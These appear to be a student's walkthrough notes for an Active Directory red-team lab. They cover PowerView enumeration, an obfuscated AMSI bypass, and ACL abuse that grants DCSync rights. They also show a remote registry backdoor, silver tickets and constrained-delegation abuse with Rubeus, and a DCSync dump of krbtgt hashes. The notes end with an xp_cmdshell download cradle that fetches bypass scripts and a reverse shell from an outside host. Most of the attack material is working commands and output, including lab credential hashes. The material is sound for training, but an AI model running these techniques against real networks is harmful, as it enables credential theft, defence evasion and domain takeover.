\"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n```\n\n**Using PowerView**\n\nStart a PowerShell session using Invisi-Shell to avoid enhanced logging. Run the below command from a command prompt on the student VM:\n\n```powershell\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\nLoad PowerView in the PowerShell session.\n\n```powershell\n. C:\\AD\\Tools\\PowerView.ps1\n```\n\n## Domain\n\n#### Using Powerview\n\n```\nGet-Domain\n```\n\n![](https://i.imgur.com/sGXUOX8.png)\n\n#### Using ADModule\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n```\nImport-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll\n```\n\n```\nImport-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1\n```\n\nget domain informations\n\n```\nGet-ADDomain\n```\n\n![](https://i.imgur.com/5Tp5DUp.png)\n\nEnumerate all the users in the current domain using the ADModule:\n\n```\nGet-ADUser -Filter *\n```\n\n\n```Powershell\nPS C:\\AD\\Tools>**Get-ADUser -Filter *  ** \nDistinguishedName :\nCN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\nEnabled : True\nGivenName :\n**Name : Administrator**\nObjectClass : user\nObjectGUID : d954e824-f549-47c2-9809-646c218cef36\nSamAccountName : Administrator\nSID : S-1-5-21-719815819-3726368948-3917688648-500\nSurname :\nUserPrincipalName :\nDistinguishedName : CN=Guest,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\nEnabled : False\nGivenName :\n**Name : Guest**\nObjectClass : user\nObjectGUID : caa69143-af4c-4551-af91-e9edd1059080\nSamAccountName : Guest\nSID : S-1-5-21-719815819-3726368948-3917688648-501\n[snip]\n```\n## Domain user\n\n```\nGet-DomainUser\n```\n\nTo list a specific property of all the users, we can use the select-object (or its alias select) cmdlet. For example, to list only the samaccountname run the following command:\n\n```\nGet-DomainUser \n```\n\nSorting \n\n```\nGet-DomainUser | select -ExpandProperty samaccountname\n```\n\n![](https://i.imgur.com/0OC8RWi.png)\n\n\n#### Finding decoy user || Deception \n\n```\nGet-DomainUser | select samaccountname,LogonCOunt\n```\n\n![](https://i.imgur.com/SV7ogHv.png)\n\n## Domain Policy (imb)\n\n```\nGet-DomainPolicy\n```\n\n![](https://i.imgur.com/EBlR4d6.png)\n\n```\n(Get-DomainPolicy).KerberosPolicy\n```\n\n![](https://i.imgur.com/69JIGgX.png)\n\n\n## Computer \n\n![](https://i.imgur.com/l96xjMk.png)\n\n```\nGet-DomainComputer | select cn,logonCount\n```\n\n![](https://i.imgur.com/Qi3EU2u.png)\n\nNow, to enumerate member computers in the domain we can use Get-DomainComputer:\n\n```\nGet-DomainComputer | select -ExpandProperty dnshostname\n```\n\n![](https://i.imgur.com/9oPN18F.png)\n\n## Domain Group\nList group \n\n```\nGet-DomainGroup -Name *admin* | select cn\n ```\n\n![](https://i.imgur.com/eTFHpZf.png)\n\n```\nGet-DomainGroup -Name *admin* -Domain {name of the DOMAIN } | select cn\n```\n\nTo see details of the Domain Admins group:\n\n```\nGet-DomainGroup -Identity \"Domain Admins\"\n```\n\n![](https://i.imgur.com/Z82IM7H.png)\n\nTo enumerate members of the Domain Admins group:\n\n```\n Get-DomainGroupMember \"Domain Admins\" | %{ $_.MemberName }\n```\n\nTo enumerate members of the Enterprise Admins group\n\n```\nGet-DomainGroupMember -Identity \"Enterprise Admins\"\n```\n\nSince, this is not a root domain, the above command will return nothing. We need to query the root domain as Enterprise Admins group is present only in the root of a forest.\n\n```\nGet-DomainGroupMember -Identity \"Enterprise Admins\" -Domain moneycorp.local\n```\n\n\n![](https://i.imgur.com/aderanb.png)\n\n\n## OUS\n\n\n- Enumerate GPO applied on the StudentMachines OU.\n\n- List all the OUs\n\n```\nGet-DomainOU\n```\n\n- To see just the names of the OUs:\n\n```\nGet-DomainOU | select -ExpandProperty name\n```\n\n- List all the computers in the StudentMachines OU.\n\n```\n(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name\n```\n\n#### Some other commands \n\n```\n Get-NetOU\n```\n\n```\n Get-NetOU -Domain dollarcorp.moneycorp.local | select name\n```\n\n![](https://i.imgur.com/QXxJ83r.png)\n\n\n## GPO \n\n- [AD Enumeration (GPO & ACL) ](https://gowthamaraj-rajendran.medium.com/red-teaming-ad-enumeration-gpo-acl-8ad59095bb4e) \n\n- List the GPOs\n\n```\nGet-DomainGPO\n```\n\nto enumerate GPO applied on the StudentMachines OU, we need to copy a part of the gplink attribute from the output of the below command:\n\n```\n(Get-DomainOU -Identity StudentMachines).gplink\n```\n\nNow, copy the highlighted string from above (no square brackets, no semicolon and nothing after semicolon) and use the it below:\n\n```\nGet-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'\n```\n\n![](https://i.imgur.com/276VvD3.png)\n\nt is possible to hack both the commands together in a single command (profiting from the static length for GUIDs):\n\n```\nGet-DomainGPO -Identity (Get-DomainOU -Identity StudentMachines).gplink.substring(11,(Get-DomainOU -Identity StudentMachines).gplink.length-72)\n```\n\n\n\n##  ACL \n\nEnumerate following for the dollarcorp domain:\n\n- ACL for the Domain Admins group\n- All modify rights/permissions for the studentx\n\nenumerate ACLs for the Domain Admins Group:\n\n```\nGet-DomainObjectAcl -Identity \"Domain Admins\" -ResolveGUIDs -Verbose\n```\n\nFinally, to check for modify rights/permissions for the student222, we can use FindInterestingDomainACL from PowerView:\n\n```\nFind-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"student222\"}\n```\n\nSince student222 is a member of the RDPUsers group, let us check permissions for it too. \n\n```\nFind-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"RDPUsers\"}\n```\n\n- Search for interesting ACEs\n\n```\nInvoke-ACLScanner\n```\n\n- checking  for ACL's \n\n```\nGet-ObjectAcl -SamAccountName student222 -ResolveGUIDs | select IdentityReference, ActiveDirectoryRights\n```\n\n## DCsync \n\nChecking Replication rights \n\n```Powershell\nGet-DomainObjectAcl -SearchBase \"DC=dollarcorp,DC=moneycorp,DC=local\" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match \"student222\"}\n```\n\n```Powershell\nC:\\AD\\Tools>C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n[snip]\nPS C:\\AD\\Tools>. C:\\AD\\Tools\\PowerView.ps1\nPS C:\\AD\\Tools>Get-DomainObjectAcl -SearchBase \"DC=dollarcorp,DC=moneycorp,DC=local\" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match \"studentx\"}\n```\n\nadding replication rights to student222\n\n```Powershell\nAdd-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student222 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose\n```\n\n\nChecking DCSync rights\n\n```Powershell\nGet-DomainObjectAcl -SearchBase\"DC=dollarcorp,DC=moneycorp,DC=local\" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match \"student222\"} \n```\n\n```Powershell\nPS C:\\AD\\Tools>Get-DomainObjectAcl -SearchBase \"DC=dollarcorp,DC=moneycorp,DC=local\" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights - match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match \"student222\"}     \nAceQualifier : AccessAllowed\nObjectDN : DC=dollarcorp,DC=moneycorp,DC=local    \nActiveDirectoryRights : ExtendedRight\nObjectAceType : DS-Replication-Get-Changes-In-Filtered-Set    \nObjectSID : S-1-5-21-719815819-3726368948-3917688648\nInheritanceFlags : None\nBinaryLength : 56\nAceType : AccessAllowedObject\nObjectAceFlags : ObjectAceTypePresent\nIsCallback : False\nPropagationFlags : None\nSecurityIdentifier : S-1-5-21-719815819-3726368948-3917688648-4101\nAccessMask : 256\nAuditFlags : None\nIsInherited : False\nAceFlags : None\nInheritedObjectAceType : All\nOpaqueLength : 0\nIdentityName : dcorp\\studentx    \nAceQualifier : AccessAllowed\nObjectDN : DC=dollarcorp,DC=moneycorp,DC=local\nActiveDirectoryRights : ExtendedRight\nObjectAceType : DS-Replication-Get-Changes\nObjectSID : S-1-5-21-719815819-3726368948-3917688648\nInheritanceFlags : None\nBinaryLength : 56\nAceType : AccessAllowedObject    \nObjectAceFlags : ObjectAceTypePresent\nIsCallback : False\nPropagationFlags : None\nSecurityIdentifier : S-1-5-21-719815819-3726368948-3917688648-4101\nAccessMask : 256\nAuditFlags : None\nIsInherited : False\nAceFlags : None\nInheritedObjectAceType : All\nOpaqueLength : 0\nIdentityName : dcorp\\studentx    \nAceQualifier : AccessAllowed\nObjectDN : DC=dollarcorp,DC=moneycorp,DC=local\nActiveDirectoryRights : ExtendedRight\nObjectAceType : DS-Replication-Get-Changes-All\nObjectSID : S-1-5-21-719815819-3726368948-3917688648\nInheritanceFlags : None\nBinaryLength : 56\nAceType : AccessAllowedObject    \nObjectAceFlags : ObjectAceTypePresent\nIsCallback : False\nPropagationFlags : None\nSecurityIdentifier : S-1-5-21-719815819-3726368948-3917688648-4101\nAccessMask : 256\nAuditFlags : None\nIsInherited : False\nAceFlags : None\nInheritedObjectAceType : All\nOpaqueLength : 0\nIdentityName : dcorp\\studentx  \n```\n\n#### WMI without requiring administrator access\n\n- Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.\n- Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.\n\n\n\nOnce we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges. Below command (to be run as Domain Administrator) modifies the host security descriptors for WMI on the DC to allow studentx access to WMI:\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat   \n```\n\n\n```\n. C:\\AD\\Tools\\RACE.ps1\n```\n\n\n```\nSet-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\\cimv2' -Verbose\n```\n\n\n```Powershell\nC:\\AD\\Tools>C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n[snip]\nPS C:\\AD\\Tools>. C:\\AD\\Tools\\RACE.ps1\nPS C:\\AD\\Tools>Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\\cimv2' -Verbose\nVERBOSE: Existing ACL for namespace root\\cimv2 is\nO:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;\nLS)(A;CIID;CCDCRP;;;AU)\nVERBOSE: Existing ACL for DCOM is\nO:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-\n562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCD\nCSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-\n2453885448-3625952902-991631256)\nVERBOSE: New ACL for namespace root\\cimv2 is\nO:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;\nLS)(A;CIID;CCDCRP;;;AU)(A;CI;CCDCLCSWRPWPR\nCWD;;;S-1-5-21-719815819-3726368948-3917688648-4101)\nVERBOSE:\nNew ACL for DCOM\nO:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-\n562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCD\nCSW;;;S-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-\n2453885448-3625952902-991631256)(A;;CCDCLCSWR\nP;;;S-1-5-21-719815819-3726368948-3917688648-4101)\n```\n\n\nNow, we can execute WMI queries on the DC as studentx:\n\n```\ngwmi -class win32_operatingsystem -ComputerName dcorp-dc\n```\n\nSimilar modification can be done to PowerShell remoting configuration. (In rare cases, you may get an I/O error while using the below command, please ignore it). Please note that this is unstable since some patches in August 2020:\n\n```\n. C:\\AD\\Tools\\RACE.ps1   \n```\n\n```\nSet-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose\n```\n\n```Powershell\nPS C:\\AD\\Tools>. C:\\AD\\Tools\\RACE.ps1     \nPS C:\\AD\\Tools>Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose     \n\n```\n\nNow, we can run commands using PowerShell remoting on the DC without DA privileges:\n\n```\nInvoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local\n```\n\n\n\nTo retrieve machine account hash without DA, first we need to modify permissions on the DC.\n\n```\n. C:\\AD\\Tools\\RACE.ps1\n```\n\n```\nAdd-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student222 -Verbose\n```\n\n\n```\nPS C:\\AD\\Tools>. C:\\AD\\Tools\\RACE.ps1     \nPS C:\\AD\\Tools>Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose    \nVERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : ] Using trustee username 'studentx'\nVERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Remote registry is not\nrunning, attempting to start\nVERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Attaching to remote registry\nthrough StdRegProv\nVERBOSE: [dcorp-dc.dollarcorp.moneycorp.local :\nSYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Backdooring\nstarted for key\nVERBOSE: [dcorp-dc.dollarcorp.moneycorp.local :\nSYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Creating ACE with\nAccess Mask of 983103\n(ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\n   \nComputerName BackdoorTrustee\n------------ ---------------\ndcorp-dc.dollarcorp.moneycorp.local student222\n```\n\n\nNow, we can retreive hash as student222:\n\n```\n. C:\\AD\\Tools\\RACE.ps1\n```\n\n```\nGet-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose\n```\n\n```Powershell\nPS C:\\AD\\Tools>. C:\\AD\\Tools\\RACE.ps1     \nPS C:\\AD\\Tools>Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose\n[snip]\n    \nComputerName MachineAccountHash\n------------ ------------------\ndcorp-dc 1be12164a06b817e834eb437dc8f581c\n```\n\n\nWe can use the machine account hash to create Silver Tickets. Create Silver Tickets for HOST and RPCSS using the machine account hash to execute WMI queries:\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4: 1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt\n```\n\n```\nC:\\AD\\Tools>C:\\AD\\Tools\\ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: silver\nC:\\AD\\Tools>echo %Pwn%\nsilver\nC:\\AD\\Tools>C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4: 1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt\n[snip]\n```\n\n\n```\ngwmi -Class win32_operatingsystem -ComputerName dcorp-dc\n```\n\n\n## unconstrained delegation\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat  \n```\n\n```\n. C:\\AD\\Tools\\PowerView.ps1 \n```\n\n```\nGet-DomainComputer -Unconstrained | select -ExpandProperty name\n```\n\n```\nC:\\AD\\Tools>C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\nPS C:\\AD\\Tools>. C:\\AD\\Tools\\PowerView.ps1\nPS C:\\AD\\Tools>Get-DomainComputer -Unconstrained | select -ExpandProperty name\nDCORP-DC\nDCORP-APPSRV\n```\n\nSince the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let's check if anyone of them have local admin privileges on dcorp-appsrv.\n\n```Powershell\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt\n```\n\n```Powershell\nC:\\AD\\Tools>echo %Pwn%\nasktgt\nC:\\AD\\Tools>C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt\n[snip]\n```\n\nRun the below commands in the new process:\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n```\n. C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1\n```\n\n```\nFind-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local\n```\n\n```\nC:\\Windows\\system32>C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\nPS C:\\Windows\\system32>. C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1\nPS C:\\Windows\\system32>Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local\ndcorp-appsrv\ndcorp-adminsrv\n```\n\n\n\n#### constrained delegation user\n\n```\n. C:\\AD\\Tools\\PowerView.ps1  \n```\n\n```\nGet-DomainUser -TrustedToAuth \n```\n\n\n![](https://i.imgur.com/YjXI47g.png)\n\n```Powershell\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:\"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL\" /ptt\n```\n\n\n```Powershell\nC:\\AD\\Tools>echo %Pwn%\ns4u\nC:\\AD\\Tools>C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:\"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL\" /ptt\n ______ _\n (_____ \\ | |\n _____) )_ _| |__ _____ _ _ ___\n | __ /| | | | _ \\| ___ | | | |/___)\n | | \\ \\| |_| | |_) ) ____| |_| |___ |\n |_| |_|____/|____/|_____)____/(___/\nv2.2.1\n[*] Action: S4U\n[*] Using aes256_cts_hmac_sha1 hash:\n2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7\n[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\\websvc'\n[*] Using domain controller: 172.16.2.1:88\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n doIFSjCCBUagAwIBBaED[snip]\n[*] Action: S4U\n[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'\n[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)\n[*] Sending S4U2self request to 172.16.2.1:88\n[+] S4U2self success!\n[*] Got a TGS for 'Administrator' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'\n[*] base64(ticket.kirbi):\n doIGHDCCBhigAwIBBaED[snip]\n[+] Ticket successfully imported!\n[*] Impersonating user 'Administrator' to target SPN 'CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL'\n[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)\n[*] Building S4U2proxy request for service: 'CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL'\n[*] Sending S4U2proxy request\n\n[+] S4U2proxy success!\n[*] base64(ticket.kirbi) for SPN 'CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL':\n doIHYzCCB1+gAwIBBaED[snip]\n[+] Ticket successfully imported!\n```\n\nCheck if the TGS is injected:\n\n```\nklist\n```\n\nTry accessing filesystem on dcorp-mssql:\n\n```\ndir \\\\dcorp-mssql.dollarcorp.moneycorp.local\\c$ \n```\n\nHTTP for - winrs \nLdap for dcsync\n#### constrained delegation computer\n\n```\nGet-DomainComputer -TrustedToAuth  \n```\n\n![](https://i.imgur.com/UUcDYOl.png)\n\n#### Abuse Constrained Delegation using dcorp-adminsrv with Rubeus\n\nWe have the AES keys of dcorp-adminsrv$ from dcorp-adminsrv machine. Run the below command from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that:\n\n```Powershell \nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorpdc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt\n```\n\nRun the below command to abuse the LDAP ticket:\n\n```\nC:\\Windows\\system32>echo %Pwn%\nlsadump::dcsync\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\\krbtgt\" \"exit\"\n```\n\n\n```Powershell\nC:\\Windows\\system32>echo %Pwn%\nlsadump::dcsync\nC:\\Windows\\system32>C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\\krbtgt\" \"exit\"\n[snip]\nObject RDN : krbtgt\n** SAM ACCOUNT **\nSAM Username : krbtgt\nAccount Type : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration :\nPassword last change : 11/11/2022 9:59:41 PM\nObject Security ID : S-1-5-21-719815819-3726368948-3917688648-502\nObject Relative ID : 502\nCredentials:\n Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986\n ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986\n lm - 0: ea03581a1268674a828bde6ab09db837\n\n```\n## SQLserver\n\n\nLet's start with enumerating SQL servers in the domain and if studentx has privileges to connect to any of them. We can use PowerUpSQL module for that. Run the below command from a PowerShell session started using Invisi-Shell:\n\n```\nImport-Module C:\\AD\\Tools\\PowerUpSQL-master\\PowerupSQL.psd1\n```\n\n```\nGet-SQLInstanceDomain | Get-SQLServerinfo -Verbose\n```\n\nSo, we can connect to dcorp-mssql. Using HeidiSQL client, let's login to dcorp-mssql using windows authentication of studentx. After login, enumerate linked databases on dcorp-mssql:\n\n`select * from master..sysservers`\n\n![](https://i.imgur.com/KUIcSjv.png)\n\nSo, there is a database link to dcorp-sql1 from dcorp-mssql. Let's enumerate further links from dcorpsql1. This can be done with the help of openquery:\n\n\n```\nselect * from openquery(\"DCORP-SQL1\",'select * from master..sysservers')\n```\n\n\nIt is possible to nest openquery within another openquery which leads us to dcorp-mgmt:\n\n\n```\nselect * from openquery(\"DCORP-SQL1\",'select * from openquery(\"DCORP-MGMT\",''select * from master..sysservers'')')\n```\n\n\nWe can also use Get-SQLServerLinkCrawl for crawling the database links automatically:\n\n```\nGet-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose\n```\n\n\n\nIf xp_cmdshell is enabled (or RPC out is true - which is set to false in this case), it is possible to execute commands on eu-sql using linked databases. To avoid dealing with a large number of quotes and escapes, we can use the following command:\n\n```\nGet-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query \"exec master..xp_cmdshell 'set username'\"\n```\n\n```Powershell \nPS C:\\AD\\Tools\\PowerUpSQL-master>Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query \"exec master..xp_cmdshell 'set username'\"\nVersion : SQL Server 2017\nInstance : DCORP-MSSQL\nCustomQuery :\nSysadmin : 0\t\n**Path : {DCORP-MSSQL}**\nUser : dcorp\\studentx\n**Links : {DCORP-SQL1, DCORP-SQL1.DOLLARCORP.MONEYCORP.LOCAL}**\nVersion : SQL Server 2017\nInstance : DCORP-SQL1\nCustomQuery :\nSysadmin : 0\n**Path : DCORP-MSSQL, DCORP-SQL1}**{\nUser : dblinkuser\n**Links : {DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL}**\nVersion : SQL Server 2017\nInstance : DCORP-SQL1\nCustomQuery :\nSysadmin : 0\n**Path : {DCORP-MSSQL, DCORP-SQL1.DOLLARCORP.MONEYCORP.LOCAL}**\nUser : dblinkuser\n**Links : {DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL}**\nVersion : SQL Server 2017\nInstance : DCORP-MGMT\nCustomQuery :\nSysadmin : 0\n**Path : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL}**\nUser : sqluser\n**Links : {EU-SQL.EU.EUROCORP.LOCAL}**\nVersion : SQL Server 2017\nInstance : DCORP-MGMT\nCustomQuery :\nSysadmin : 0\n**Path : {DCORP-MSSQL, DCORP-SQL1.DOLLARCORP.MONEYCORP.LOCAL, DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL}**\nUser : sqluser\n**Links : {EU-SQL.EU.EUROCORP.LOCAL}**\nVersion : SQL Server 2017\nInstance : EU-SQL\nCustomQuery : {nt service\\mssqlserver, }\nSysadmin : 1\n**Path : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL, EU-SQL.EU.EUROCORP.LOCAL}**\nUser : sa\nLinks :\nVersion : SQL Server 2017\nInstance : EU-SQL\n**CustomQuery : {nt service\\mssqlserver, }**\nSysadmin : 1\n**Path : {DCORP-MSSQL, DCORP-SQL1.DOLLARCORP.MONEYCORP.LOCAL, DCORP-MGMT.DOLLARCORP.MONEYCORP.LOCAL, EU-SQL.EU.EUROCORP.LOCAL}**\nUser : sa\nLinks :\n```\n\nLet's try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sql instance. Remember to start a listener:\n\n\n```\nGet-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c \"iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)\"''' -QueryTarget eu-sql  \n```\n\n## Trust \n\n- Enumerate all domains in the moneycorp.local forest.\n- Map the trusts of the dollarcorp.moneycorp.local domain.\n- Map External trusts in moneycorp.local forest.\n- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?\n\n\nenumerate all domains in the current forest:\n```\nGet-ForestDomain -Verbose\n```\n\nTo map all the trusts of the dollarcorp domain:\n\n```\nGet-DomainTrust\n```\n\nNow, to list only the external trusts in the moneycorp.local forest:\n\n```\nGet-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq \"FILTER_SIDS\"}\n```\n\nTo identify external trusts of the dollarcorp domain, we can use the below command:\n\n```\nGet-DomainTrust | ?{$_.TrustAttributes -eq \"FILTER_SIDS\"}\n```\n\nSince the above is a Bi-Directional trust, we can extract information from the eurocorp.local forest. We either need bi-directional trust or one-way trust from eurocorp.local to dollarcorp to be able to use the below command. Let's go for the last task and enumerate trusts for eurocorp.local forest:\n\n```\nGet-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}\n```\n\n\n**Using Active Directory module**\n\nImport the AD Module in a PowerShell session started using Invisi-Shell:\n\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n\n```\nImport-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll\n```\n\n```\nImport-Module 